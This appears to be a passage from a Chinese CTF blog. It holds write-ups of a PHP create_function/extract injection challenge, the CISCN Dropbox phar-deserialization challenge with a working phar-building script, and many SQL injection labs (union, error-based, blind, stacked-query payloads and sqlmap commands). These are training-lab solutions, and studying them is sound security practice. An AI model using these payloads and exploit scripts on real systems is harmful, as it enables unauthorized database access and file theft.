首先说一下create_function注入 create_function() 函数有两个参数 $args 和 $code，用于创建一个 lambda 样式的函数 但是我们可以通过对b进行操作，来实现这个函数的提前闭合，并写入我们想要的命令，然后通过注释符使语句合理 $arg 和 $code 变量都是可控的，因为 extract() 函数使用数组键名作为变量名，使用数组键值作为变量值，针对数组中的每个元素，将在当前符号表中创建对应的一个变量。因此只要 extract() 内的数组键名为 arg 和 code，键值为我们构造的用来注入的代码，即可实现 $arg 和 $code 的变量覆盖，导致代码注入。 再利用 var_dump(get_defined_vars()) 用来输出所有变量和值 &#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e 解码内容： &#x2F;1nD3x.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZGVidV9kZWJ1X2FxdWE&#x3D;&amp;debu&#x3D;aqua_is_cute &amp;shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;&amp;flag[code]&#x3D;create_function 但是看见flag在rea1fl4g里 所以要利用require包含这个文件然后再用get_defined_vars()读一遍试试 但是又过滤了. 所以试试base64编码 GET: &#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;%7d%72%65%71%75%69%72%65%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%63%6d%56%68%4d%57%5a%73%4e%47%63%75%63%47%68%77%29%29%3b%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e POST: file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1 还是不行，尝试伪协议读源码了只能 require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php) 采用取反绕过过滤 GET: &#x2F;1nD3x.php?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;&#125;require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e &#x2F;&#x2F;这里不知道为什么把require也取反就没法用了 POST: file&#x3D;1&amp;debu&#x3D;1&amp;shana[]&#x3D;1&amp;passwd[]&#x3D;1 &#x2F;&#x2F; preg_match() 只能匹配字符串，数组得以绕过。 2020BJDCTF “EzPHP” +Y1ngCTF “Y1ng’s Baby Code” 官方writeup – 颖奇L&#39;Amore (gem-love.com) 原题用异或也可以，贴个脚本先，万一以后能用到 #Author: piCEBDC7 str_&#x3D; &#39;1flag.php&#39; str_&#x3D;list(str_) final&#x3D;&#39;&#39; for x in str_: print(hex(~ord(x)&amp;0xff)) final+&#x3D;hex(~ord(x)&amp;0xff) print(str_) final &#x3D; final.replace(&#39;0x&#39;,&#39;%&#39;) final+&#x3D;&#39;^&#39; for x in range(len(str_)): final+&#x3D;r&#39;%ff&#39; print(final) 取反脚本 &lt;? &#x2F;&#x2F;Author: 颖奇L&#39;Amore &#x2F;&#x2F;Blog: www.gem-love.com $a &#x3D; &quot;p h p : &#x2F; &#x2F; f i l t e r &#x2F; r e a d &#x3D; c o n v e r t . b a s e 6 4 - e n c o d e &#x2F; r e s o u r c e &#x3D; 1 f l a g . p h p&quot;; $arr1 &#x3D; explode(&#39; &#39;, $a); echo &quot;&lt;br&gt;~(&quot;; foreach ($arr1 as $key &#x3D;&gt; $value) &#123; echo &quot;%&quot;.bin2hex(~$value); &#125; echo &quot;)&lt;br&gt;&quot;; 用羽师傅那个也行 [CISCN2019 华北赛区 Day1 Web1]Dropbox知识点：phar的反序列化 传个jpg文件然后下载的时候抓包有个filename，这里可以实现任意文件读取 index.php &lt;?php session_start(); if (!isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: login.php&quot;); die(); &#125; ?&gt; &lt;?php include &quot;class.php&quot;; $a &#x3D; new FileList($_SESSION[&#39;sandbox&#39;]); $a-&gt;Name(); $a-&gt;Size(); ?&gt; download.php &lt;?php session_start(); if (!isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: login.php&quot;); die(); &#125; if (!isset($_POST[&#39;filename&#39;])) &#123; die(); &#125; include &quot;class.php&quot;; ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:&#x2F;etc:&#x2F;tmp&quot;); chdir($_SESSION[&#39;sandbox&#39;]); $file &#x3D; new File(); $filename &#x3D; (string) $_POST[&#39;filename&#39;]; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) &#x3D;&#x3D;&#x3D; false) &#123; Header(&quot;Content-type: application&#x2F;octet-stream&quot;); Header(&quot;Content-Disposition: attachment; filename&#x3D;&quot; . basename($filename)); echo $file-&gt;close(); &#125; else &#123; echo &quot;File not exist&quot;; &#125; ?&gt; login.php &lt;?php session_start(); if (isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: index.php&quot;); die(); &#125; ?&gt; &lt;?php include &quot;class.php&quot;; if (isset($_GET[&#39;register&#39;])) &#123; echo &quot;&lt;script&gt;toast(&#39;注册成功&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;; &#125; if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123; $u &#x3D; new User(); $username &#x3D; (string) $_POST[&quot;username&quot;]; $password &#x3D; (string) $_POST[&quot;password&quot;]; if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123; $_SESSION[&#39;login&#39;] &#x3D; true; $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username); $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;; if (!is_dir($sandbox)) &#123; mkdir($sandbox); &#125; $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox; echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;); die(); &#125; echo &quot;&lt;script&gt;toast(&#39;账号或密码错误&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;; &#125; ?&gt; class.php &lt;?php error_reporting(0); $dbaddr &#x3D; &quot;127.0.0.1&quot;; $dbuser &#x3D; &quot;root&quot;; $dbpass &#x3D; &quot;root&quot;; $dbname &#x3D; &quot;dropbox&quot;; $db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname); class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db &#x3D; $db; &#125; public function user_exist($username) &#123; $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count &#x3D; $stmt-&gt;num_rows; if ($count &#x3D;&#x3D;&#x3D; 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if ($this-&gt;user_exist($username)) &#123; return false; &#125; $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;); $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;); $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;); $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;); $stmt-&gt;bind_param(&quot;s&quot;, $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125; &#125; class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files &#x3D; array(); $this-&gt;results &#x3D; array(); $this-&gt;funcs &#x3D; array(); $filenames &#x3D; scandir($path); $key &#x3D; array_search(&quot;.&quot;, $filenames); unset($filenames[$key]); $key &#x3D; array_search(&quot;..&quot;, $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file &#x3D; new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] &#x3D; array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;; $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;; foreach ($this-&gt;funcs as $func) &#123; $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;; &#125; $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;; $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;; foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123; $table .&#x3D; &#39;&lt;tr&gt;&#39;; foreach ($result as $func &#x3D;&gt; $value) &#123; $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;; &#125; $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;; $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;; &#125; echo $table; &#125; &#125; class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename &#x3D; $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size &#x3D; filesize($this-&gt;filename); $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;); for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125; &#125; ?&gt; delete.php &lt;?php session_start(); if (!isset($_SESSION[&#39;login&#39;])) &#123; header(&quot;Location: login.php&quot;); die(); &#125; if (!isset($_POST[&#39;filename&#39;])) &#123; die(); &#125; include &quot;class.php&quot;; chdir($_SESSION[&#39;sandbox&#39;]); $file &#x3D; new File(); $filename &#x3D; (string) $_POST[&#39;filename&#39;]; if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header(&quot;Content-type: application&#x2F;json&quot;); $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;); echo json_encode($response); &#125; else &#123; Header(&quot;Content-type: application&#x2F;json&quot;); $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;); echo json_encode($response); &#125; ?&gt; phar反序列化利用条件： 1）phar文件要能够上传至服务器 2）要有可用的魔术方法为跳板 3）文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤 对于本题而言，第一条满足，第二条有一个魔术方法__call()和FileList类、User类的__destruct()，恐怕想不利用它们也不行，第三条后半部分没问题，前半部分则需要我们找一找。 既文件操作函数，就应该在本题的File类（至多也在FileList类）的方法中寻找，毕竟整个题目基本上都是在面向对象的基础上编程，对文件的操作也都是对File类的对象的操作， 我们看到，open()方法调用了file_exists()和is_dir()函数（注意name方法里的basename函数不算），size()方法调用了filesize()函数，delete()方法调用了unlink()函数，close()方法file_get_contents()函数。 我们前面提到了，本题要读取/flag.txt文件，故刚刚列举的这些函数中，虽然文件操作函数不少，可以用来触发反序列化，对读取文件有用的只有close()方法中的file_get_contents()函数这一个，所以我们可以对它分析， 这个时候，如果想不到__call()方法和__destruct()方法，基本上就可以放弃了，在phar题目里，魔术方法一般来讲是必须要用的， 这里我们看到，FileList的__call()方法语义简单，就是遍历files数组，对每一个file变量执行一次$func，然后将结果存进$results数组， 接下来的__destruct函数会将FileList对象的funcs变量和results数组中的内容以HTML表格的形式输出在index.php上（我们可以看到，index.php里创建了一个FileList对象，在脚本执行完毕后触发__destruct，则会输出该用户目录下的文件信息）， User对象的__destruct()方法， 无非就是 脚本执行完毕后，执行$db的close()的方法（来关闭数据库连接），但话说回来，没有括号里的话，这句话依然成立，而且这个&#39;close&#39;与File类中的close()方法同名。所以，当db的值为一个FileList对象时，User对象析构之时，会触发FileList-&gt;close()，但FileList里没有这个方法，于是调用_call函数，进而执行file_get_contents($filename)，读取了文件内容。整个链的结构也很简单清晰：在我们控制$db为一个FileList对象的情况下，$user-&gt;__destruct() =&gt; $db-&gt;close() =&gt; $db-&gt;__call(&#39;close&#39;) =&gt; $file-&gt;close() =&gt; $results=file_get_contents($filename) =&gt; FileList-&gt;__destruct()输出$result。 反序列化脚本 &lt;?php class User &#123; public $db; &#125; class File&#123; public $filename; public function __construct($name)&#123; $this-&gt;filename&#x3D;$name; &#125; &#125; class FileList &#123; private $files; public function __construct()&#123; $this-&gt;files&#x3D;array(new File(&#39;&#x2F;flag.txt&#39;)); &#125; &#125; $o &#x3D; new User(); $o-&gt;db &#x3D;new FileList(); @unlink(&quot;phar.phar&quot;); $phar &#x3D; new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $phar-&gt;setMetadata($o); $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); ?&gt; 参考文章 [CISCN2019 华北赛区 Day1 Web1]Dropbox之愚见 - 简书 (jianshu.com) [(24条消息) 关于phar反序列化——BUUCTF-CISCN2019 华北赛区 Day1 Web1]Dropbox_silence1_的博客-CSDN博客_buuctf 反序列化","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"sql题wp","slug":"buu-sql题wp","date":"2021-06-16T08:30:58.000Z","updated":"2022-03-28T08:19:39.337Z","comments":true,"path":"2021/06/16/buu-sql题wp/","link":"","permalink":"https://ethe448.github.io/2021/06/16/buu-sql%E9%A2%98wp/","excerpt":"sql好难.jpg","text":"sql好难.jpg [极客大挑战 2019]EasySQL 用户框里输入单引号出现报错，猜测为字符型注入 利用1&#39;or 1#注入得到flag [强网杯 2019]随便注先试一下万能密码 利用1‘ order by 可以试出该表中存在两个字段 接下来要用堆叠查询（利用分号执行多个sql语句） 尝试先查询数据库 成功。 再查询表名 看到有两个表，查询两个表中的字段 words表内存在两个字段 1919810931114514表内存在一个字段，flag在该表内。 （查询该表时表名要在反单引号内） 1&#39;;show columns from 1919810931114514# 所以可以猜测 内部查询语句类似 : select id, data from words where id = 所以要把words表改为word1，将flag所在的表表名改为words，然后将flag改名为id； payload：1&#39;;rename table words to word1;rename table 1919810931114514 to words; alert table words change flag id varchar(100);# 再用1’ or 1#注入 也可以把words表改为words，将flag所在的表表名改为words，再为其添加id列，并将flag改为data payload：1&#39;;rename table words to word1;rename table 1919810931114514 to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# 再将1提交可直接获得flag [SUCTF 2019]EasySQL进入后输入1有回显 输入1‘无回显猜测是数字型注入 用堆叠注入的方式 查到存在一个flag表，尝试查看里面的内容 大概是被过滤了，只好百度搜wp了 看到dalao能够猜出后端语句为select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag （搜到一篇wp说原环境中存在源码泄露，所以能够知道这部分的sql语言，但是buu的环境里没有[BUUCTF SUCTF 2019] EasySQL_Senimo-CSDN博客） 解法一：输入*,1 由于||在MySQL中起或的作用，因此1||flag会返回1，也就变成了 select *,1 from Flag. 成功找到flag 如果查询的参数不存在，那就会创建一个临时的列，并且设置该列所有参数都是查询的参数。所以整个payload语句的意思就是查询所有数据，然后增加了一个临时列，结果看图，第一列是数据库中的数据，第二列是添加的临时列1 因此在查询的flag后还有一个值为1的临时列 解法二 把&quot;||&quot;变成字符串连接符，而不是或。这里涉及到mysql中sql_mode参数设置，设置sql_mode=pipes_as_concat字符就可以设置。 payload：1;set sql_mode=PIPES_AS_CONCAT;select 1 也能获得flag。 这是查询语句相当于select 1flag from Flag (不太懂为啥这样也能查出来，1flag是列名如果Flag表里没有这一列呢？？) [极客大挑战 2019]LoveSQL用到了联合查询 原理篇——sql注入2：联合查询注入 - 这太秃然了 - 博客园 (cnblogs.com) SQL注入之联合查询注入_selecthch的博客-CSDN博客_联合注入 参考一下 常规步骤 1. 判断注入点 2. 判断注入类型（数字型型or字符型） 3. 判断字段数 4. 判断回显位 5. 确定数据库名 6. 确定表名 7. 确定字段名 8. 拿到数据 1.判断注入点 ​ 在输入的用户名后添加单引号返回出错，猜测存在注入 2.判断注入类型 ​ 在用户名后输入1’ or 1#后成功进入，但还是没有拿到flag，因此继续尝试注入 3.判断字段数 ​ 当order by 4时出错，因此应有三个字段数 4.判断回显位 5。确定数据库名 ​ 为了获取所有数据库名，要利用group_concat()函数令其一次性显示出来 1&#39; union select 1,2,group_concat(database());# 6.确定表名 1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();# 【INFORMATION_SCHEMA 数据库】 是MySQL自带的，它提供了访问数据库 元数据 的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。 常用字段 字段 含义 Table_catalog 数据表登记目录 Table_schema 数据表所属的数据库名 Table_name 表名称 Table_type 表类型[system view|base table] Engine 使用的数据库引擎[MyISAM|CSV|InnoDB] Version 版本，默认值10 Row_format 行格式[Compact|Dynamic|Fixed] Table_rows 表里所存多少行数据 Avg_row_length 平均行长度 Data_length 数据长度 Max_data_length 最大数据长度 Index_length 索引长度 Data_free 空间碎片 Auto_increment 做自增主键的自动增量当前值 Create_time 表的创建时间 Update_time 表的更新时间 Check_time 表的检查时间 Table_collation 表的字符校验编码集 Checksum 校验和 Create_options 创建选项 Table_comment 表的注释、备注 确定字段名 猜测flag应该在l0ve1ysq1表中，因此查找该表内的字段名 1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;;# 8.拿到数据 查找这三列中的全部数据，利用group_concat(); 1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1#; 得到flag MySQL默认有“information_schema”的数据库，该库中有三个表名： 1、SCHEMATA：存储该用户创建的所有数据库的库名，记录库名的字段为SCHEMA_NAME。2、TABLES：存储该用户创建的所有数据库的库名和表名，记录库名和表名的字段为TABLE_SCHEMA和TABLE_NAME。3、COLUMNS：存储该用户创建的所有数据库的库名、表名和字段名，库名、表名和字段名为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。 ctfhub—SQL 整数型注入输入1有回显 输入1 and 1=2无回显，既存在注入点，整数型注入 利用order by可知存在两个字段 利用联合查询查询数据库名称 再查找表名 flag应该就在flag表内，再查找字段名 最后得到flag ctfhub—SQL字符型注入利用order by判断字段数 输入-1&#39; union select 1,2#判断回显位置 查数据库名 查表名 查字段名 查flag -1&#39; union select 1,group_concat(flag) from flag# 感觉和整数型注入差不多 ctfhub—报错注入利用xpath语法错误来进行报错注入主要利用extractvalue和updatexml两个函数。 extractvalue() 函数原型：extractvalue(xml_document,Xpath_string) 正常语法：extractvalue(xml_document,Xpath_string); 第一个参数：xml_document是string格式，为xml文档对象的名称 第二个参数：Xpath_string是xpath格式的字符串 作用：从目标xml中返回包含所查询值的字符串 第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容 payload模板 &#39; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) 0x7e=’~’ concat(‘a’,‘b’)=“ab” version()=@@version ‘~‘可以换成’#’、’$&#39;等不满足xpath格式的字符 extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位 返回结果不能超过一条 若超过则需再查询语句后添加limit x,1或用group_concat()函数 updatexml() updatexml()函数与extractvalue()类似，是更新xml文档的函数。 and 1=(updataxml(1,concat(0x7e,(sql_inject),0x7e),1)) flood() 原理还没看明白（ 先放个模板在这 1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x; 题目： 利用extractvalue 输入单引号提示语法错误，输入and 1=1能正确查询，猜测为数字型，利用extractvalue函数爆库名 再爆表名 这里提示太长因此利用group_concat()函数 猜到flag再flag表内爆列名 最后查询内容 1 and extractvalue(1,concat(0x7e,(select flag from flag limit 0,1),0x7e)) 由于extractvalue函数只能显示32位字符，所以要利用substring函数进行分割 利用substring查看右边31位字符 最后可以拿到flag ctfhub{ff3bb0327849e1b9e0e6abfd} 利用updataxml函数 利用flood函数 ctfhub—布尔盲注只有出现数据提交正确和错误两种不同的页面（报错型至少语法错误会回显错误到页面上）或者无法使用联合查询。 步骤 用错误和正确两种反馈进行逐一试验，猜测出闭合 利用length来逐一测试字符串的长度 利用substr来逐一的测试，测试库名、表名、列名和其他数据 最后得到数据 函数 length() 返回字符串的长度 length(abc) 返回3，表示abc字符串长度为3 substr() 截取字符串 substr(abc,1,1) 返回a，从abc的第一位开始截取，步长为1 mid() 取出字符串的一部分值 mid(abc,1,1) 返回a，从abc的第一位开始取，步长为1， 与substr()用法一致 left() 取出字符串左边的几个数据 left(abc,1) 返回a left(abc,2) 返回ab right() 取出右边的几个数据 right(abc,1) 返回c right(abc,2) 返回bc ord() 与ascii() 返回一个字符的ascii码值 ascii(s) 返回114 hex() 返回16进制数 先猜数据库长度&gt;3时返回成功，&gt;4时返回失败可以得到数据库名长度为4 接下来利用substr和ascii函数猜名字 首字母ascii码大于114时返回成功，大于115时返回失败，可得到首字母的ascii码为115，为s 第二位同理可以得到ascii码值为113，为q 最后可得数据库名为sqli 再猜表名 1 and substr((select table_name from information_schema.tables where table_schema=&#39;sqli&#39; limit 0,1),1,1)=&#39;n&#39; （感觉这部分应该用bp抓包爆破更方便） 吧limit后的0改为1猜第二个表名 最后能得到有news和flag两个表 再猜字段 首字母ascii码为102，为f 同理能得到字段名为flag 最后爆内容 太多了，用bp爆破完感觉也很难找，估计用py写脚本会方便很多 用sqlmap： -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 --dbs查库名 -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables 查表名 -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columns查字段名 -u http://challenge-b896931f16bb5e67.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C flag --dump查值 ctfhub—时间盲注利用sleep函数进行盲注 若and之前的语句正确则成功执行sleep 能得到是数字型注入 接下来利用if语句进行注入是否成功的判断1 and if(查询语句,sleep(2),1) 若为真则执行sleep（2），若为假则执行1 接下来步骤与布尔盲注相似 猜数据库名（也可以利用ascii码来猜，但因为ctfhub的sql题名称都一样，就直接试字符了） 1 and if(substr(database(),1,1)=&#39;s&#39;,sleep(2),1)# 猜表的数量 1 and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(2),1)# 猜表名 1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;0,sleep(2),1)# 将limit后的0改为1再猜第二个表名 分别为news 和 flag 猜flag表内字段数量 1 and if((select count(column_name) from information_schema.columns where table_name=&#39;flag&#39;)=1,sleep(2),1)# 猜字段名 1 and if(ascii(substr((select column_name from information_schema.columns where table_name=&#39;flag&#39; limit 0,1),1,1))&gt;102,sleep(2),1)# 最终可以猜出字段名为flag 再猜内容 1 and if(ascii(substr((select flag from flag limit 0,1),1,1))&gt;99,sleep(2),1)# 这部分应该还是要用python或者sqlmap 过滤空格看题目就知道空格被过滤了，这里可以利用/**/注释符来替代空格，其他步骤和字符型注入一样 最后得到flag 贴个别人总结的过滤和绕过 SQL注入一些过滤及绕过总结_obsetear的博客-CSDN博客 [极客大挑战 2019]BabySQL看到界面提示存在过滤 输入1&#39; and 1=1# 1‘ or 1# 1&#39; and select 1 from 1#等语句根据返回的错误信息可以知道过滤了select or and union from by where 这里可以利用双写绕过，首先利用order by查字段数可以查到表内有三列 1&#39; oorrder bbyy 4;# 接下来可以利用联合查询 先看回显1&#39; ununionion selselectect 1,2,3;# 查库名1&#39; ununionion selselectect 1,2,database();# 查表名 1&#39; ununionion selselectect 1,2,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database());# flag应该在b4bsql表里，爆一下列名 1&#39; ununionion selselectect 1,2,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;);# 最后爆内容1&#39; ununionion selselectect 1,2,(selselectect group_concat(id,username,passwoorrd) frfromom b4bsql);# [极客大挑战 2019]HardSQL试了一下，and union 空格 等于都被过滤了尝试了几种绕过姿势都没成功，看了下别人的wp说是报错注入 利用括号来去掉查询语句中的空格 先查库 0&#39;or(extractvalue(1,concat(0x7e,(database()),0x7e)))# 再查表 由于等于号也被过滤了，所以要用like admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(database()))),0x7e)))# 爆列名 admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(&#39;H4rDsq1&#39;))),0x7e)))# 最后爆内容 admin&#39;or(extractvalue(1,concat(0x7e,(select(group_concat(id,username,password))from(H4rDsq1)),0x7e)))# flag{66f2f5cd-207d-4d50-87 由于extractvalue显示字符数的限制，要用substr函数对其进行分割 admin&#39;or(extractvalue(1,concat(0x7e,right((select(group_concat(id,username,password))from(H4rDsq1)),31),0x7e)))# cd-207d-4d50-87bd-d8b762ffce95} 最后拼一下得到flag flag{66f2f5cd-207d-4d50-87bd-d8b762ffce95} [SWPU2019]Web1进入后是个登录页面，注册个账号之后登录 可以知道注入点在广告位上 试一下可以知道or and #都被过滤了 因为过滤了＃号，所以要保证后面的单引号能闭合 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;‘1’&#x3D;‘1 得到回显位置2，3. 因为or被过滤，且无法通过大小写和双写绕过，那么information_schema因为含有or，所以也没法使用。这里有两种方法可以绕过 SQL注入：限制条件下获取表名、无列名注入 - MustaphaMond - 博客园 (cnblogs.com) 